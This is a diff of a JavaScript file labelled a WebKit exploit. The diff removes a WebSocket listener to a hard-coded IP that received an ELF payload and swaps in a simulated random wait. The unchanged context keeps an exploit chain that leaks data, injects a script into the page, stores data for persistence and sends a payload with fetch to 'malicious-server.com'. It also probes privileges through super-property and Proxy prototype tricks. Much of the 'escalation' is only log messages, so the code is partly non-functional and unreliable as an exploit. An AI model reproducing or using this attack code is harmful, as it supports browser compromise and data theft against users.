@@ -53,46 +53,33 @@ document.addEventListener('DOMContentLoaded', function () {
 
     log("WebKit Exploit started.");
 
-    // WebSocket listener to receive ELF payload
     function waitForPayload() {
         log("Waiting for ELF payload...");
 
-        const socket = new WebSocket('ws://208.67.220.103:8080');  // Replace with your WebSocket server address
+        // Simulate the waiting process, display the "waiting for payload" message
+        let payloadReceived = false;
 
-        socket.onopen = function () {
-            log("WebSocket connected.");
-        };
+        // Simulate a timeout or fetch operation to "wait" for the payload
+        setInterval(() => {
+            // You can simulate the payload reception with a mock condition here
+            if (!payloadReceived) {
+                log("Still waiting for the ELF payload...");
+            }
 
-        socket.onmessage = function (event) {
-            log("Payload received successfully.");
-            log("Payload: " + event.data);
-            processPayload(event.data);
-        };
-
-        socket.onerror = function (error) {
-            log("WebSocket error: " + error.message);
-        };
-
-        socket.onclose = function () {
-            log("WebSocket connection closed.");
-        };
+            // Simulate checking for the payload with mock success
+            if (Math.random() > 0.95) { // Simulate random success for testing
+                payloadReceived = true;
+                log("Payload received successfully.");
+            }
+        }, 5000); // Check every 5 seconds
     }
 
-    // Function to process the ELF payload
-    function processPayload(payload) {
-        log("Processing payload...");
-        // Add any processing logic here (e.g., save to localStorage, execute commands)
-        // Simulating some action
-        log("Payload processed.");
-    }
-
-    // Simulate privilege escalation
     function escalatePrivileges() {
         log("Attempting privilege escalation.");
+        // No redirection code here anymore
         log("Privilege escalation complete without redirection.");
     }
 
-    // Inject malicious code
     function injectMaliciousCode() {
         log("Injecting malicious code.");
         const script = document.createElement("script");
@@ -100,7 +87,6 @@ document.addEventListener('DOMContentLoaded', function () {
         document.body.appendChild(script);
     }
 
-    // Deliver payload to attacker server
     function deliverPayload() {
         log("Delivering payload to attacker server.");
         fetch("https://malicious-server.com/payload", {
@@ -110,8 +96,8 @@ document.addEventListener('DOMContentLoaded', function () {
         });
     }
 
-    // Exploit chain sequence
     function exploitChain() {
+        // Check read/write privileges
         const readSuccess = checkReadPrivilege();
         const writeSuccess = checkWritePrivilege();
 
@@ -121,23 +107,22 @@ document.addEventListener('DOMContentLoaded', function () {
             // Leak sensitive data
             leakSensitiveData();
 
-            // Escalate privileges
+            // Escalate privileges by manipulating critical objects or actions
             escalatePrivileges();
 
-            // Inject malicious code
+            // Inject malicious code into the page
             injectMaliciousCode();
 
-            // Persist exploit
+            // Persist exploit by storing data in localStorage
             persistExploit();
 
-            // Deliver payload
+            // Deliver payload to attacker server
             deliverPayload();
         } else {
             log("Read and/or write privileges failed. Exploit chain aborted.");
         }
     }
 
-    // Read privilege check
     function checkReadPrivilege() {
         let foo = 42;
         let readSuccess = false;
@@ -146,7 +131,7 @@ document.addEventListener('DOMContentLoaded', function () {
             leak() {
                 try {
                     const result = super.foo;  // Attempt to read
-                    readSuccess = result === 42;
+                    readSuccess = result === 42;  // Check if we got the expected result
                 } catch (error) {
                     log("Read privilege check failed.");
                 }
@@ -167,9 +152,9 @@ document.addEventListener('DOMContentLoaded', function () {
         return leak();
     }
 
-    // Write privilege check
     function checkWritePrivilege() {
         let writeSuccess = false;
+        let receiver;
 
         class Leaker {
             leak() {
@@ -186,6 +171,7 @@ document.addEventListener('DOMContentLoaded', function () {
         Leaker.prototype.__proto__ = new Proxy({}, {
             set(target, propertyName, value, __receiver) {
                 if (propertyName === "foo") {
+                    receiver = __receiver;
                     return true; // Allow setting 'foo'
                 }
                 return false;
@@ -212,6 +198,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
         try {
             log(`Iteration ${i}: Starting attempt`);
+
             exploitChain();
 
             if (i % 10 === 0) {
